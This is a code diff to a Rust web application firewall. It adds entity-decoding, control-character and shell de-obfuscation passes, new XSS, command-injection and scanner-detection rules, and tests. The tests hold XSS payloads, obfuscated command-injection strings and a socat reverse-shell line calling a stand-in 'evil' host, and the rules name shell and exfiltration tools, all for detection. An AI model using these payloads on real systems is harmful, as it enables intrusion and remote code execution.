@@ -460,6 +460,17 @@ impl Waf {
 		})
 	}
 
+	/// Like [`match_raw`](Self::match_raw) but return only the lowest-index enabled rule **of
+	/// `category`** that fires, ignoring every other category. The shell-evasion de-obfuscation
+	/// pass uses this so an aggressive quote/backslash strip can only ever surface a
+	/// command-injection signature — never accidentally trip an unrelated rule on the mangled form.
+	fn match_raw_in_category(&self, haystack: &str, location: &str, category: WafCategory) -> Option<WafMatch> {
+		self.set.matches(haystack).iter().filter(|&idx| self.enabled[idx] && self.meta[idx].1 == category).min().map(|idx| {
+			let (rule_id, category) = self.meta[idx];
+			WafMatch { rule_id, category, location: location.to_owned(), score: None }
+		})
+	}
+
 	/// Inspect one field whose encoding follows path/header rules (`%XX` only, `+` is a
 	/// literal). Body inspection and the tests use this; query strings use
 	/// [`inspect_field`](Self::inspect_field) with `plus_is_space = true`.
@@ -500,8 +511,41 @@ impl Waf {
 		//    close the whitespace/comment-padding evasion (`UNION/**/SELECT`, `AND  1=1`). Only
 		//    when the transform actually changed something (a plain payload skips this pass).
 		let stripped = strip_sql_comments_collapse_ws(&norm.decoded);
-		if stripped != norm.decoded {
-			return self.match_raw(&stripped, location);
+		if stripped != norm.decoded
+			&& let Some(m) = self.match_raw(&stripped, location)
+		{
+			return Some(m);
+		}
+		// 6. Match the HTML-entity-decoded form, closing the entity-obfuscated protocol-URI
+		//    evasion (`java&#115;cript:`, `&#x6a;avascript:`, `javascript&colon;`) so the
+		//    `xss_js_uri` / `xss_data_html_uri` / `xss_vbscript_uri` signatures fire on the
+		//    reassembled token. Runs on the percent-decoded form, so a `%26%23106%3B`-wrapped
+		//    entity collapses through both passes. Only when the decode actually changed input.
+		let entity = html_entity_decode(&norm.decoded);
+		if entity != norm.decoded
+			&& let Some(m) = self.match_raw(&entity, location)
+		{
+			return Some(m);
+		}
+		// 7. Match the control-character-stripped form (built on the entity-decoded string, so an
+		//    entity-then-control combo like `java&Tab;script:` collapses too): browsers ignore
+		//    embedded NUL/TAB/LF/CR in a URL scheme or tag name, so `java\tscript:` / `<scri\npt>`
+		//    reassemble to their signature once the C0 controls are removed.
+		let unctrl = strip_control_chars(&entity);
+		if unctrl != entity
+			&& let Some(m) = self.match_raw(&unctrl, location)
+		{
+			return Some(m);
+		}
+		// 8. Match the shell-evasion-stripped form, command-injection rules ONLY: an attacker splits
+		//    a command word with quotes/backslashes/empty `$@` expansions (`c'a't`, `c\at`, `c$@at`)
+		//    so the literal `cmdi_*` signature never appears until the shell reassembles it. The
+		//    category filter keeps this aggressive strip from surfacing an unrelated signature.
+		let deobf = strip_shell_evasion(&norm.decoded);
+		if deobf != norm.decoded
+			&& let Some(m) = self.match_raw_in_category(&deobf, location, WafCategory::CommandInjection)
+		{
+			return Some(m);
 		}
 		None
 	}
@@ -609,6 +653,43 @@ impl Waf {
 			self.match_all_raw(&stripped, location, &mut extra);
 			for m in extra {
 				if !out[start..].iter().any(|seen| seen.rule_id == m.rule_id) {
+					out.push(m);
+				}
+			}
+		}
+		// The HTML-entity-decoded form likewise contributes, so an entity-obfuscated protocol
+		// URI (`java&#115;cript:`) scores the same as its literal form. Deduped within the field.
+		let entity = html_entity_decode(&norm.decoded);
+		if entity != norm.decoded {
+			let mut extra = Vec::new();
+			self.match_all_raw(&entity, location, &mut extra);
+			for m in extra {
+				if !out[start..].iter().any(|seen| seen.rule_id == m.rule_id) {
+					out.push(m);
+				}
+			}
+		}
+		// And the control-character-stripped form (over the entity-decoded string), so a
+		// `java\tscript:` / `<scri\npt>` splice scores like its literal form. Deduped within the field.
+		let unctrl = strip_control_chars(&entity);
+		if unctrl != entity {
+			let mut extra = Vec::new();
+			self.match_all_raw(&unctrl, location, &mut extra);
+			for m in extra {
+				if !out[start..].iter().any(|seen| seen.rule_id == m.rule_id) {
+					out.push(m);
+				}
+			}
+		}
+		// And the shell-evasion-stripped form, contributing only its command-injection matches (the
+		// aggressive quote/backslash strip is scoped to that category), so a `c'a't`-obfuscated
+		// command scores like its literal form. Deduped within the field.
+		let deobf = strip_shell_evasion(&norm.decoded);
+		if deobf != norm.decoded {
+			let mut extra = Vec::new();
+			self.match_all_raw(&deobf, location, &mut extra);
+			for m in extra {
+				if m.category == WafCategory::CommandInjection && !out[start..].iter().any(|seen| seen.rule_id == m.rule_id) {
 					out.push(m);
 				}
 			}
@@ -790,6 +871,216 @@ const fn hex_val(b: u8) -> Option<u8> {
 	}
 }
 
+/// Curated named HTML character references — the delimiters and separators an attacker uses to
+/// split a protocol token (`javascript&colon;`, `data&sol;text`) rather than the full HTML5
+/// named set. Decoded by [`html_entity_decode`] alongside the numeric `&#DDD;` / `&#xHH;` forms.
+/// Case-sensitive, matching HTML semantics (`&Tab;`, not `&TAB;`); the numeric forms cover the
+/// rest of the letters. Kept small on purpose so the pass never mangles ordinary `&name;` text
+/// beyond this delimiter set.
+const NAMED_ENTITIES: &[(&str, char)] = &[
+	("amp", '&'),
+	("lt", '<'),
+	("gt", '>'),
+	("quot", '"'),
+	("apos", '\''),
+	("colon", ':'),
+	("sol", '/'),
+	("lpar", '('),
+	("rpar", ')'),
+	("equals", '='),
+	("period", '.'),
+	("comma", ','),
+	("semi", ';'),
+	("Tab", '\t'),
+	("NewLine", '\n'),
+];
+
+/// The longest named-entity key in [`NAMED_ENTITIES`] (`"NewLine"`), bounding the scan for the
+/// terminating `;` so a stray `&` in ordinary text costs at most this many byte comparisons.
+const MAX_NAMED_ENTITY_LEN: usize = 7;
+
+/// The number of HTML-entity-decode passes [`html_entity_decode`] runs before stopping — enough
+/// to collapse a doubly-encoded reference (`&amp;#106;` → `&#106;` → `j`) without unbounded work.
+const MAX_ENTITY_PASSES: usize = 3;
+
+/// Decode HTML character references in `input`, closing the entity-obfuscated evasion class
+/// (OWASP-CRS rules 941210/941130): an attacker writes `java&#115;cript:`, `&#x6a;avascript:`, or
+/// `javascript&colon;alert(1)` so the literal `javascript:` / `data:text/html` signature never
+/// appears until a browser's HTML parser reassembles it. Three reference forms are recognized:
+///
+/// - **Decimal** `&#DDD;` → the code point (`&#106;` → `j`). A trailing `;` is optional (HTML
+///   tolerates `&#106` before a non-digit), so `&#106avascript:` still decodes its head.
+/// - **Hex** `&#xHH;` / `&#XHH;` → the code point (`&#x6a;` → `j`); trailing `;` optional.
+/// - **Named** — the curated [`NAMED_ENTITIES`] delimiter set (`&colon;` → `:`, `&sol;` → `/`,
+///   `&Tab;` → tab, …). Here the `;` is **required**, so an ordinary `AT&T` / `a=1&b=2` is left
+///   untouched — the pass never eats a query separator or a bare ampersand in text.
+///
+/// Runs to a fixed point (bounded by [`MAX_ENTITY_PASSES`]) so a doubly-encoded `&amp;#106;`
+/// collapses through `&#106;` to `j`. A malformed or unrecognized reference is left verbatim.
+/// Byte-wise like [`percent_decode_once`], finishing with [`String::from_utf8_lossy`], so
+/// multi-byte UTF-8 already present survives and the output is always valid UTF-8 for matching.
+fn html_entity_decode(input: &str) -> String {
+	let mut cur = input.to_owned();
+	for _ in 0..MAX_ENTITY_PASSES {
+		let (next, changed) = html_entity_decode_once(&cur);
+		if !changed {
+			break;
+		}
+		cur = next;
+	}
+	cur
+}
+
+/// One pass of [`html_entity_decode`]: replace each recognized character reference with its
+/// decoded character, leaving everything else verbatim. Returns the result and whether any
+/// reference was replaced (the fixed-point signal for the caller).
+fn html_entity_decode_once(input: &str) -> (String, bool) {
+	let b = input.as_bytes();
+	let mut out: Vec<u8> = Vec::with_capacity(b.len());
+	let mut changed = false;
+	let mut i = 0;
+	while i < b.len() {
+		if b[i] == b'&'
+			&& let Some((ch, len)) = parse_entity(&b[i..])
+		{
+			let mut buf = [0u8; 4];
+			out.extend_from_slice(ch.encode_utf8(&mut buf).as_bytes());
+			i += len;
+			changed = true;
+			continue;
+		}
+		out.push(b[i]);
+		i += 1;
+	}
+	(String::from_utf8_lossy(&out).into_owned(), changed)
+}
+
+/// De-obfuscate a Unix shell command word by removing the no-op metacharacters an attacker inserts
+/// *inside* a command name to break a literal signature while the shell still runs it — the
+/// character-insertion RCE-evasion class (OWASP-CRS rules 932230/932235, the "RCE evasion prefixes"
+/// called out in the CRS 4.28.0 release). Three no-op forms are stripped:
+///
+/// - **Quote insertion** — `'` and `"` are dropped, keeping their content, so `c'a't` / `c"a"t` →
+///   `cat` (the shell removes the quotes and concatenates).
+/// - **Backslash escapes** — a `\` is dropped, keeping the following character, so `c\at` → `cat`
+///   (`\c` → `c` for an ordinary char).
+/// - **Empty parameter-expansion spacers** — an expansion that yields the empty string and so
+///   splits a command *between* characters: `$@` / `$*` (`c$@at` → `cat`), a single-digit
+///   positional `$1`..`$9` (`c$1at` → `cat`), and a braced `${name}` (`who${x}ami` → `whoami`) —
+///   the "uninitialized variable spacer" RCE evasion CRS 4.28.0 added (Rule 932). See
+///   [`shell_var_spacer_len`]. `$IFS` / `${IFS}` are *kept* (they expand to whitespace, a separate
+///   signal via `cmdi_ifs_evasion`), and a bare `$name` is kept too — the shell consumes the
+///   following letters into the variable name, so it does not reassemble a split command.
+///
+/// The result is fed to [`Waf::match_raw_in_category`] with [`WafCategory::CommandInjection`] only,
+/// so this deliberately aggressive strip can surface a de-obfuscated shell command but can never
+/// mangle input into an unrelated (SQLi/XSS/…) signature. Byte-wise with [`String::from_utf8_lossy`],
+/// mirroring [`percent_decode_once`], so multi-byte UTF-8 survives. The existing `cmdi_*` signatures
+/// (which anchor on a leading `;`/`&`/`|`/backtick/`$` separator) then fire on the reassembled word.
+fn strip_shell_evasion(input: &str) -> String {
+	let b = input.as_bytes();
+	let mut out: Vec<u8> = Vec::with_capacity(b.len());
+	let mut i = 0;
+	while i < b.len() {
+		match b[i] {
+			b'\'' | b'"' | b'\\' => i += 1, // drop the quote/backslash, keep what follows
+			b'$' => match shell_var_spacer_len(&b[i..]) {
+				Some(len) => i += len, // empty-expanding spacer: drop it whole
+				None => {
+					out.push(b[i]); // a `$` to keep (`$IFS`, `$(`, bare `$name`, bare `$`)
+					i += 1;
+				}
+			},
+			_ => {
+				out.push(b[i]);
+				i += 1;
+			}
+		}
+	}
+	String::from_utf8_lossy(&out).into_owned()
+}
+
+/// If `rest` (which starts with `$`) is a shell parameter expansion that yields the *empty* string
+/// — the token-splitting "spacer" evasion used to break a command word between characters — return
+/// the byte length to drop. Recognizes `$@` / `$*`, a single-digit positional `$1`..`$9`, and a
+/// braced identifier `${name}`. Returns `None` for a `$` to keep: `$IFS` / `${IFS}` (expands to
+/// whitespace — its own signal via `cmdi_ifs_evasion`), `$(` command substitution, a bare `$name`
+/// (the shell folds the trailing letters into the variable name, so it cannot rejoin a split
+/// command), a two-plus-digit `$12` (`$1` then literal `2`), or a lone `$`.
+fn shell_var_spacer_len(rest: &[u8]) -> Option<usize> {
+	match rest.get(1) {
+		Some(b'@' | b'*') => Some(2),                          // "$@" / "$*"
+		Some(&c) if c.is_ascii_digit() => Some(2),             // single-digit positional "$1".."$9"
+		Some(b'{') => {
+			let mut j = 2;
+			while j < rest.len() && (rest[j].is_ascii_alphanumeric() || rest[j] == b'_') {
+				j += 1;
+			}
+			// A bare "${name}" (non-empty identifier, not IFS, no operator) expands empty; drop it.
+			if j > 2 && rest.get(j) == Some(&b'}') && &rest[2..j] != b"IFS" {
+				Some(j + 1)
+			} else {
+				None
+			}
+		}
+		_ => None,
+	}
+}
+
+/// Strip the C0 control characters a browser silently drops while parsing a URL scheme, an HTML
+/// tag name, or an attribute — NUL (`\0`), TAB, LF, VT, FF, CR — rejoining a token that was split
+/// to evade a literal signature (`java\tscript:`, `<scri\npt>`, a `%00`-spliced `javascript:`).
+/// This is the CRS `t:removeNulls` / embedded-whitespace transform: an additional matched form,
+/// never the string served, so it only ever *adds* coverage. Non-control and multi-byte UTF-8
+/// characters pass through untouched. Fast-paths the common no-control input to avoid an
+/// allocation. Pairs with [`html_entity_decode`] (applied to its output) so an entity-then-control
+/// combo (`java&Tab;script:`) collapses too.
+fn strip_control_chars(input: &str) -> String {
+	if !input.bytes().any(|b| matches!(b, 0x00 | 0x09 | 0x0A | 0x0B | 0x0C | 0x0D)) {
+		return input.to_owned();
+	}
+	input.chars().filter(|&c| !matches!(c, '\0' | '\t' | '\n' | '\u{0b}' | '\u{0c}' | '\r')).collect()
+}
+
+/// Parse a single HTML character reference at the head of `rest` (which begins with `&`).
+/// Returns the decoded `char` and the number of bytes consumed (the `&`, the body, and any
+/// trailing `;`), or `None` when `rest` does not open a reference this decoder recognizes.
+fn parse_entity(rest: &[u8]) -> Option<(char, usize)> {
+	if rest.get(1) == Some(&b'#') {
+		// Numeric reference: decimal `&#DDD;` or hex `&#xHH;` / `&#XHH;`.
+		let (radix, mut j) = if matches!(rest.get(2), Some(b'x' | b'X')) { (16u32, 3) } else { (10u32, 2) };
+		let start = j;
+		let mut value: u32 = 0;
+		while j < rest.len() {
+			let digit = if radix == 16 { hex_val(rest[j]).map(u32::from) } else { (rest[j] as char).to_digit(10) };
+			match digit {
+				Some(v) => {
+					value = value.saturating_mul(radix).saturating_add(v);
+					j += 1;
+				}
+				None => break,
+			}
+		}
+		if j == start {
+			return None; // `&#;`, `&#x;`, or a non-digit body: not a numeric reference.
+		}
+		if rest.get(j) == Some(&b';') {
+			j += 1; // Optional terminating semicolon.
+		}
+		return char::from_u32(value).map(|ch| (ch, j));
+	}
+	// Named reference: `&name;`, semicolon required. Scan at most the longest key for the `;`.
+	let mut j = 1;
+	while j < rest.len() && j <= MAX_NAMED_ENTITY_LEN && rest[j] != b';' {
+		j += 1;
+	}
+	if rest.get(j) != Some(&b';') {
+		return None;
+	}
+	let name = &rest[1..j];
+	NAMED_ENTITIES.iter().find(|(ent, _)| ent.as_bytes() == name).map(|(_, ch)| (*ch, j + 1))
+}
+
 /// The built-in starter ruleset: a small, curated set of high-signal patterns across
 /// the classic classes. Deliberately conservative to keep false positives low; extend
 /// it via [`Waf::new`] for fuller coverage. Patterns are case-insensitive where case
@@ -857,6 +1148,16 @@ pub fn starter_rules() -> Vec<Rule> {
 		// handlers are the go-to bypass when the classic `onerror`/`onload` list is filtered:
 		// animation/transition/pointer events and the popover `onbeforetoggle` all auto-fire.
 		Rule { id: "xss_html5_event_handler", category: WafCategory::Xss, pattern: r"(?i)\bon(animation(start|end|iteration)|transitionend|pointer(over|down|enter|rawupdate)|beforetoggle|beforeprint|pageshow|hashchange|wheel)\s*=" },
+		// Interaction / clipboard / drag / media event handlers (OWASP-CRS 941 handler-list port):
+		// the mouse, keyboard, clipboard, drag-and-drop, and media families that fire on ordinary
+		// user interaction and are the standard bypass once the small `xss_event_handler` set
+		// (error/load/click/mouseover/focus/toggle) and the `xss_html5_event_handler` (animation/
+		// transition/pointer/…) set are filtered — `onmousedown`, `onkeydown`, `oncontextmenu`,
+		// `ondragstart`, `oncanplay`, `onpaste`, … Each alternative is disjoint from the other two
+		// rules (`load(start|eddata)`, not bare `load`; `mouse(out|down|…)`, not `mouseover`;
+		// `focus(in|out)`, not bare `focus`) so a match never double-counts in anomaly scoring.
+		// <https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf>
+		Rule { id: "xss_interaction_event_handler", category: WafCategory::Xss, pattern: r"(?i)\bon(mouse(enter|leave|move|out|down|up)|auxclick|dblclick|contextmenu|key(down|up|press)|drag(start|end|enter|leave|over)?|drop|copy|cut|paste|play(ing)?|canplay|ended|load(start|eddata)|focus(in|out)|input|submit)\s*=" },
 		// Injection-only attributes: an iframe `srcdoc` carrying inline markup, and a `formaction`
 		// that hijacks a form's submit target. Reflected into a response these are near-always an
 		// XSS vector; an operator legitimately reflecting them can disable this rule.
@@ -896,6 +1197,14 @@ pub fn starter_rules() -> Vec<Rule> {
 		Rule { id: "cmdi_shell_command", category: WafCategory::CommandInjection, pattern: r"(?i)[;&|`$]\s*(cat|ls|id|whoami|uname|wget|curl|ncat|nc|bash|sh|python|perl|powershell|cmd)\b" },
 		Rule { id: "cmdi_path_bin", category: WafCategory::CommandInjection, pattern: r"(?i)/bin/(sh|bash|dash|zsh|busybox|nc)\b" },
 		Rule { id: "cmdi_command_substitution", category: WafCategory::CommandInjection, pattern: r"(?i)\$\(\s*(cat|ls|id|whoami|uname|wget|curl|nc|bash|sh|env|echo|printf)\b" },
+		// Network-recon / exfil clients and dangerous file/privilege utilities past the core
+		// `cmdi_shell_command` set (OWASP-CRS 932xxx command list). Same leading-separator anchor
+		// (`;`/`&`/`|`/backtick/`$` then optional whitespace) as `cmdi_shell_command`, which is the
+		// false-positive guard: a bare `dig`/`base64`/`fetch` in prose stays clean, but one riding a
+		// shell separator (`; nslookup evil`, `| base64 -d`, `` `socat …` ``) is near-always
+		// injection. Command names are disjoint from `cmdi_shell_command` so a hit never
+		// double-counts in anomaly scoring. <https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf>
+		Rule { id: "cmdi_recon_and_utility", category: WafCategory::CommandInjection, pattern: r"(?i)[;&|`$]\s*(nslookup|dig|telnet|tftp|socat|scp|ssh|ftp|lynx|fetch|chmod|chown|crontab|mkfifo|mknod|base64|xxd|msfvenom|busybox)\b" },
 		Rule { id: "cmdi_windows_command", category: WafCategory::CommandInjection, pattern: r"(?i)[;&|]\s*(dir|type|net\s+user|ping\s+-n|certutil|bitsadmin|tasklist|systeminfo)\b" },
 		// PowerShell download-cradle / encoded-command RCE (OWASP-CRS rules 932120/932125): the vectors
 		// the `cmd.exe`-flavored `cmdi_windows_command` misses — the `Invoke-*` cmdlets and their
@@ -1030,9 +1339,12 @@ pub fn starter_rules() -> Vec<Rule> {
 		// `User-Agent` carries). Requiring the trailing `/` is the false-positive guard: prose that
 		// merely *mentions* a tool (`/docs/sqlmap-guide`, `?q=how+to+use+wpscan`) lacks the version
 		// slash, so it stays clean, while a real `sqlmap/1.7`, `Nikto/2.1.6`, `ghauri/1.x`,
-		// `WhatWAF/…` UA trips. ghauri + WhatWAF are the CRS 4.26.0 additions.
-		// <https://www.linuxcompatible.org/story/owasp-crs-4260-released>
-		Rule { id: "scanner_security_tool", category: WafCategory::ScannerDetection, pattern: r"(?i)\b(sqlmap|nikto|ghauri|whatwaf|nuclei|wpscan|dirbuster|gobuster|feroxbuster|acunetix|netsparker|nessus|arachni|w3af|masscan|zgrab|zmap|jaeles|commix|xsser|wfuzz)/" },
+		// `WhatWAF/…` UA trips. ghauri + WhatWAF are the CRS 4.26.0 additions; ffuf / dalfox /
+		// dirsearch / feroxbuster / katana / subfinder / wafw00f / whatweb / joomscan / droopescan /
+		// cmsmap / sqlninja / havij / dirb round out the current offensive-tooling landscape.
+		// Deliberately excludes names that collide with legitimate client-library UAs (e.g.
+		// `python-httpx/…`), which would false-positive. <https://coreruleset.org/>
+		Rule { id: "scanner_security_tool", category: WafCategory::ScannerDetection, pattern: r"(?i)\b(sqlmap|nikto|ghauri|whatwaf|nuclei|wpscan|dirbuster|dirsearch|dirb|gobuster|feroxbuster|ffuf|dalfox|sqlninja|havij|wafw00f|whatweb|joomscan|droopescan|cmsmap|katana|subfinder|acunetix|netsparker|nessus|arachni|w3af|masscan|zgrab|zmap|jaeles|commix|xsser|wfuzz)/" },
 		// Nmap's HTTP probe (NSE) carries a distinctive multi-word phrase rather than a `name/`
 		// version token, so it gets its own signature.
 		Rule { id: "scanner_nmap_nse", category: WafCategory::ScannerDetection, pattern: r"(?i)nmap scripting engine" },
@@ -1242,6 +1554,47 @@ mod tests {
 	}
 
 	#[test]
+	fn interaction_event_handlers_match() {
+		// OWASP-CRS 941 handler-list port: the mouse/keyboard/clipboard/drag/media families past the
+		// classic and HTML5 sets. Each attributes to the new rule (disjoint from the other two).
+		let waf = Waf::starter();
+		for payload in [
+			"x=<div onmousedown=alert(1)>",
+			"x=<body onkeydown=alert(1)>",
+			"x=<img oncontextmenu=alert(1)>",
+			"x=<a ondragstart=alert(1)>",
+			"x=<video oncanplay=alert(1)>",
+			"x=<input onpaste=alert(1)>",
+			"x=<b onmouseout=alert(1)>",
+			"x=<z onfocusin=alert(1)>",
+		] {
+			let m = waf.inspect_str(payload, "query").unwrap_or_else(|| panic!("{payload} should trip the interaction-handler rule"));
+			assert_eq!(m.rule_id, "xss_interaction_event_handler", "{payload}");
+			assert_eq!(m.category, WafCategory::Xss);
+		}
+	}
+
+	#[test]
+	fn interaction_event_handler_no_overlap_with_classic_and_html5() {
+		// The disjointness the comment promises: `onmouseover` / `onload` / `onfocus` stay on their
+		// original rules, not the new one, so anomaly scoring never double-counts a single handler.
+		let waf = Waf::starter();
+		assert_eq!(waf.inspect_str("x=<a onmouseover=alert(1)>", "query").unwrap().rule_id, "xss_event_handler");
+		assert_eq!(waf.inspect_str("x=<svg onload=alert(1)>", "query").unwrap().rule_id, "xss_event_handler");
+		assert_eq!(waf.inspect_str("x=<a onfocus=alert(1)>", "query").unwrap().rule_id, "xss_event_handler");
+	}
+
+	#[test]
+	fn interaction_event_handler_keeps_false_positives_low() {
+		// Words that merely embed a handler substring but are not `on<handler>=` attributes stay
+		// clean: `dragon`/`onward` (no word-boundary handler), a benign `drop`/`copy` query key.
+		let waf = Waf::starter();
+		for uri in ["/game?dragon=slain", "/go?onward=true", "/cart?drop=item&copy=1", "/media?canplay=check"] {
+			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
+		}
+	}
+
+	#[test]
 	fn html5_xss_rules_keep_false_positives_low() {
 		// Params that merely start with `on`/contain `action` but are not event handlers or the
 		// dangerous attributes stay clean.
@@ -1324,6 +1677,35 @@ mod tests {
 		assert_eq!(m.category, WafCategory::CommandInjection);
 		assert_eq!(m.rule_id, "cmdi_shell_command");
 		assert_eq!(waf.inspect_str("cmd=/bin/sh -c whoami", "target").unwrap().rule_id, "cmdi_path_bin");
+	}
+
+	#[test]
+	fn recon_and_utility_commands_match() {
+		// Network-recon / exfil clients and dangerous utilities on a shell separator each attribute
+		// to the new rule (disjoint from `cmdi_shell_command`), so anomaly scoring never double-counts.
+		let waf = Waf::starter();
+		for payload in [
+			"host=1;nslookup evil.example",
+			"x=| base64 -d payload",
+			"y=`socat tcp:evil:1 exec:sh`",
+			"z=&chmod 777 /tmp/x",
+			"w=;tftp -g evil",
+			"v=$xxd -r dump",
+		] {
+			let m = waf.inspect_str(payload, "query").unwrap_or_else(|| panic!("{payload} should trip the recon/utility rule"));
+			assert_eq!(m.rule_id, "cmdi_recon_and_utility", "{payload}");
+			assert_eq!(m.category, WafCategory::CommandInjection);
+		}
+	}
+
+	#[test]
+	fn recon_and_utility_commands_keep_false_positives_low() {
+		// The command words in prose or as ordinary path/query tokens — without a leading shell
+		// separator — must stay clean; the separator anchor is the guard.
+		let waf = Waf::starter();
+		for uri in ["/docs/how-to-use-ssh", "/blog/base64-explained", "/search?q=dig+into+data", "/tools/chmod-calculator"] {
+			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
+		}
 	}
 
 	#[test]
@@ -1420,6 +1802,60 @@ mod tests {
 		let waf = Waf::starter();
 		assert!(waf.inspect_str("total=$IFSprofit", "query").is_none(), "$IFSprofit should not false-positive");
 		for uri in ["/docs/if-statements", "/api/config?tpl=${IF}-then"] {
+			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
+		}
+	}
+
+	#[test]
+	fn shell_evasion_transforms() {
+		// Quote/backslash insertion and empty `$@`/`$*` expansions inside a command word are
+		// removed; ordinary text (and multi-byte UTF-8) is untouched.
+		assert_eq!(strip_shell_evasion("c'a't"), "cat");
+		assert_eq!(strip_shell_evasion(r#"c"a"t"#), "cat");
+		assert_eq!(strip_shell_evasion(r"c\at"), "cat");
+		assert_eq!(strip_shell_evasion("c$@at"), "cat");
+		assert_eq!(strip_shell_evasion("w$*get"), "wget");
+		// Uninitialized-variable / positional-parameter spacers (CRS 4.28.0 Rule 932).
+		assert_eq!(strip_shell_evasion("c$1at"), "cat");
+		assert_eq!(strip_shell_evasion("who${x}ami"), "whoami");
+		assert_eq!(strip_shell_evasion("c${undef}at"), "cat");
+		// Kept: `$IFS`/`${IFS}` (whitespace, its own rule) and a bare `$name` (folds the letters).
+		assert_eq!(strip_shell_evasion("cat${IFS}x"), "cat${IFS}x");
+		assert_eq!(strip_shell_evasion("who$uami"), "who$uami");
+		assert_eq!(strip_shell_evasion("plain café"), "plain café");
+	}
+
+	#[test]
+	fn char_insertion_rce_is_caught() {
+		// OWASP-CRS 932230/932235 character-insertion evasion: a command word split by quotes,
+		// backslashes, or empty `$@`/`$*` expansions reassembles to a `cmdi_*` signature after the
+		// strip. Covers the raw and percent-encoded (`%5c` backslash, `%27` quote) delivery forms.
+		let waf = Waf::starter();
+		// Targets chosen to trip no other category at the raw step, so the match is attributable to
+		// the de-obfuscated command word alone (`inspect_str` still runs the percent-decode pass).
+		for payload in [
+			"; c'a't secret.txt",
+			r"| w\get http://host/x",
+			"& n\"c\" -e shell",
+			"; c$@at note.txt",
+			"; who${x}ami now",        // braced uninitialized-variable spacer
+			"; c$1at note.txt",        // positional-parameter spacer
+			";%20c%27a%27t%20note.txt", // percent-encoded quotes
+			";%20c%5cat%20note.txt",    // percent-encoded backslash
+		] {
+			let m = waf.inspect_str(payload, "query").unwrap_or_else(|| panic!("{payload} should be caught after shell de-obfuscation"));
+			assert_eq!(m.category, WafCategory::CommandInjection, "{payload}");
+		}
+	}
+
+	#[test]
+	fn shell_evasion_strip_is_scoped_to_command_injection() {
+		// The aggressive quote/backslash strip must not surface an unrelated signature: a value whose
+		// *stripped* form would look like a quoted SQL tautology is not blocked by this pass (the raw
+		// form, lacking the tautology shape, is clean), because the pass only accepts cmdi matches.
+		let waf = Waf::starter();
+		// No leading shell separator + command word, so nothing de-obfuscates into a cmdi rule.
+		for uri in ["/note?q=O%27Brien%20and%20Sons", "/path?p=C%3A%5CUsers%5Cbin", "/q?s=it%27s%20a%20test"] {
 			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
 		}
 	}
@@ -1700,6 +2136,95 @@ mod tests {
 		let (decoded2, changed2) = percent_decode_once("bare % and %zz");
 		assert!(!changed2);
 		assert_eq!(decoded2, "bare % and %zz");
+	}
+
+	#[test]
+	fn html_entity_decode_transforms() {
+		// Decimal (semicolon optional), hex (either case), and named delimiter references decode;
+		// unrecognized / bare ampersands pass through; a doubly-encoded reference collapses.
+		assert_eq!(html_entity_decode("java&#115;cript:"), "javascript:");
+		assert_eq!(html_entity_decode("&#x6a;avascript:"), "javascript:");
+		assert_eq!(html_entity_decode("&#X6A;avascript:"), "javascript:");
+		assert_eq!(html_entity_decode("&#106avascript:"), "javascript:"); // no trailing semicolon
+		assert_eq!(html_entity_decode("javascript&colon;alert(1)"), "javascript:alert(1)");
+		assert_eq!(html_entity_decode("data&#58;text&sol;html"), "data:text/html");
+		assert_eq!(html_entity_decode("java&amp;#115;cript:"), "javascript:"); // double-encoded
+		// Left verbatim: a bare ampersand, a query separator, and an unknown named entity.
+		assert_eq!(html_entity_decode("AT&T Corp"), "AT&T Corp");
+		assert_eq!(html_entity_decode("a=1&b=2"), "a=1&b=2");
+		assert_eq!(html_entity_decode("&notareal;entity"), "&notareal;entity");
+		assert_eq!(html_entity_decode("plain value"), "plain value");
+	}
+
+	#[test]
+	fn entity_obfuscated_protocol_uri_is_caught() {
+		// CRS 941210/941130: the entity-obfuscated `javascript:` / `data:text/html` / `vbscript:`
+		// forms slip past the literal signature until the entity-decode pass reassembles them.
+		let waf = Waf::starter();
+		for (payload, rule) in [
+			("java&#115;cript:alert(1)", "xss_js_uri"),
+			("&#x6a;avascript:alert(1)", "xss_js_uri"),
+			("javascript&colon;alert(1)", "xss_js_uri"),
+			("href=data&colon;text/html,PHN2Zz4", "xss_data_html_uri"),
+			("vb&#115;cript:msgbox(1)", "xss_vbscript_uri"),
+		] {
+			let m = waf.inspect_str(payload, "query").unwrap_or_else(|| panic!("{payload} should be caught after entity decode"));
+			assert_eq!(m.rule_id, rule, "{payload}");
+		}
+	}
+
+	#[test]
+	fn entity_and_percent_obfuscated_js_uri_is_caught() {
+		// The entity decode runs on the percent-decoded form, so a `%26%23106%3B`-wrapped `&#106;`
+		// collapses through both passes back to `javascript:`.
+		let waf = Waf::starter();
+		let v = waf.inspect(&parts("GET", "/x?u=%26%23106%3Bavascript:alert(1)"));
+		assert_eq!(blocked(&v).rule_id, "xss_js_uri");
+	}
+
+	#[test]
+	fn entity_decode_keeps_false_positives_low() {
+		// Ordinary ampersands — a company name, multi-param query separators — must not be decoded
+		// into a spurious signature.
+		let waf = Waf::starter();
+		for uri in ["/about?q=AT%26T%20Corp", "/search?a=1&b=2&c=3", "/p?note=fish%20%26%20chips"] {
+			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
+		}
+	}
+
+	#[test]
+	fn strip_control_chars_transforms() {
+		// The six C0 controls a browser drops are removed, rejoining a split token; other
+		// characters (including multi-byte UTF-8) are untouched; the no-control fast path is a no-op.
+		assert_eq!(strip_control_chars("java\tscript:"), "javascript:");
+		assert_eq!(strip_control_chars("<scri\npt>"), "<script>");
+		assert_eq!(strip_control_chars("\0javascript:"), "javascript:");
+		assert_eq!(strip_control_chars("a\r\n\u{0b}\u{0c}b"), "ab");
+		assert_eq!(strip_control_chars("plain café"), "plain café");
+	}
+
+	#[test]
+	fn control_char_obfuscated_signature_is_caught() {
+		// Browsers ignore embedded C0 controls in a scheme / tag name; the strip pass reassembles
+		// the token so the signature fires — raw, percent-encoded, and entity-then-control combos.
+		let waf = Waf::starter();
+		for (payload, rule) in [
+			("java\tscript:alert(1)", "xss_js_uri"),
+			("<scri\npt>alert(1)</script>", "xss_script_tag"),
